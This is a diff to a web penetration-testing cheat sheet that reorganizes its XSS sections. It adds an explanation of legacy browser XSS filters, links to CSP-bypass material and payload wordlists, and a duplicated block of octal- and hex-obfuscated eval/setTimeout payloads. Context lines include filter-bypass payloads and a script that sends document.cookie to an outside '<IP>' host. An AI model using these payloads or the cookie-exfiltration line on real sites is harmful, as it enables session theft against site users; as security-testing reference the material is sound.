@@ -314,20 +314,25 @@ Below are some examples of DOM-based XSS, where malicious code is dynamically ma
 ?user=javascript:alert(1)
 ```
 
-### XSS Protection
--> XSS Auditor and XSS Filter  
-https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md  
-https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html  
-https://www.chromium.org/developers/design-documents/xss-auditor/  
-https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge  
-https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection
+### XSS Auditor and XSS Filter
+XSS Auditor and XSS Filter were security mechanisms implemented in Google Chrome, Internet Explorer, and of Microsoft Edge to mitigate Cross-Site Scripting (XSS) attacks. The XSS Auditor, present in Chrome until its discontinuation, analyzed the content reflected in HTTP responses and blocked potentially malicious snippets of code before they were executed. The XSS Filter, used in Internet Explorer, inspected the DOM and input data for typical XSS patterns. Both were useful initially, but had limitations and could be worked around, as well as causing false positives. The X-XSS-Protection header allowed controlling these protections, activating or deactivating the mechanism according to the server configuration. Microsoft Edge also supported this feature in its earlier versions, but it was eventually removed in favor of more robust security mechanisms. Currently, these filters are only relevant for older browsers, such as Internet Explorer, older versions of Chrome, and legacy versions of Microsoft Edge, as modern browsers no longer use these technologies. 
 
--> Wordlists for XSS Bypass  
+Today, with the obsolescence of these mechanisms, secure coding practices are adopted, such as input validation and sanitization, output encoding, and the use of the Content-Security-Policy (CSP) security header.
+
+-> References  
+https://www.chromium.org/developers/design-documents/xss-auditor/  
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/X-XSS-Protection  
+https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge  
+
+### Bypassing a Content-Security-Policy (CSP)
+-> Useful Links  
+https://www.vaadata.com/blog/content-security-policy-bypass-techniques-and-security-best-practices/  
+https://www.cobalt.io/blog/csp-and-bypasses  
+https://portswigger.net/research/using-form-hijacking-to-bypass-csp
+
+### Cheat Sheets
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/xss_bypass.txt  
-https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst  
-https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/XSS%20Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt
-https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt  
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html  
 
 ### XSS Keylogger
 https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/  
@@ -340,6 +345,76 @@ http://www.businessinfo.co.uk/labs/mxss/
 ### XSS Polyglot
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot  
 https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way
+
+### Obfuscation with Execution Sinks for Bypass
+#### Eval 
+-> Execute JS code contained in a string directly  
+
+#### setInterval
+-> Executes JS code contained in a string repeatedly after an interval.  
+-> e.g. setInterval("alert('xss')", 1000);  
+-> If delay is omitted, it is treated as undefined, and the browser uses a minimum delay (~4ms to 10ms)   
+
+#### setTimeout 
+-> Executes JS code contained in a string once after a delay.  
+-> e.g. setTimeout("alert('xss')", 1000);  
+-> If the delay argument is missing, it executes immediately  
+
+#### Examples of using execution sinks with obfuscation
+-> eval + octal  
+```html
+<img src=x onerror="eval('\141lert(1)')"/>
+```
+
+-> setInterval + hexadecimal  
+```
+<img src=x onerror="setInterval('\x61lert(1)')"/>
+```
+
+-> setTimeout + hex + octal  
+```
+<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
+```
+
+##### Converters
+- https://checkserp.com/encode/unicode/  
+- http://www.unit-conversion.info/texttools/octal/  
+- http://www.unit-conversion.info/texttools/hexadecimal/
+
+### Obfuscation with Execution Sinks for Bypass
+#### Eval 
+-> Execute JS code contained in a string directly  
+
+#### setInterval
+-> Executes JS code contained in a string repeatedly after an interval.  
+-> e.g. setInterval("alert('xss')", 1000);  
+-> If delay is omitted, it is treated as undefined, and the browser uses a minimum delay (~4ms to 10ms)   
+
+#### setTimeout 
+-> Executes JS code contained in a string once after a delay.  
+-> e.g. setTimeout("alert('xss')", 1000);  
+-> If the delay argument is missing, it executes immediately  
+
+#### Examples of using execution sinks with obfuscation
+-> eval + octal  
+```html
+<img src=x onerror="eval('\141lert(1)')"/>
+```
+
+-> setInterval + hexadecimal  
+```
+<img src=x onerror="setInterval('\x61lert(1)')"/>
+```
+
+-> setTimeout + hex + octal  
+```
+<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
+```
+
+##### Converters
+- https://checkserp.com/encode/unicode/  
+- http://www.unit-conversion.info/texttools/octal/  
+- http://www.unit-conversion.info/texttools/hexadecimal/  
 
 ### Regex Blacklist Filtering
 Sometimes you can find a filter being applied as sanitization to mitigate Cross-Site Scripting (XSS), in this case there are ways to bypass this protection:  
@@ -389,40 +464,11 @@ eval(decodeURIComponent(/alert(%22xss%22)/.source))
 <img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>
 ```
 
-### Add execution sinks  
-#### Eval 
--> Execute JS code contained in a string directly  
-
-#### setInterval
--> Executes JS code contained in a string repeatedly after an interval.  
--> e.g. setInterval("alert('xss')", 1000);  
--> If delay is omitted, it is treated as undefined, and the browser uses a minimum delay (~4ms to 10ms)   
-
-#### setTimeout 
--> Executes JS code contained in a string once after a delay.  
--> e.g. setTimeout("alert('xss')", 1000);  
--> If the delay argument is missing, it executes immediately  
-
-#### Examples of using execution sinks with obfuscation
--> eval + octal  
-```html
-<img src=x onerror="eval('\141lert(1)')"/>
-```
-
--> setInterval + hexadecimal  
-```
-<img src=x onerror="setInterval('\x61lert(1)')"/>
-```
-
--> setTimeout + hex + octal  
-```
-<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
-```
-
-##### Converters
-- https://checkserp.com/encode/unicode/  
-- http://www.unit-conversion.info/texttools/octal/  
-- http://www.unit-conversion.info/texttools/hexadecimal/  
+### Bypass Wordlists for XSS
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/xss_bypass.txt  
+https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst  
+https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/XSS%20Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt  
+https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt  
 
 ### JavaScript Encoding
 -> jjencode  
@@ -453,7 +499,7 @@ https://malwaredecoder.com/
 <script>fetch('http://<IP>/?cookie=' + btoa(document.cookie));</script>  
 ```
 
-### Tools
+### XSS Tools
 -> dalfox  
 ```
 dalfox url http://example.com
@@ -466,7 +512,7 @@ echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
 ```
 https://github.com/KathanP19/Gxss
 
-### Template - Nuclei
+### XSS Templates - Nuclei
 https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
 
 ## Git Exposed
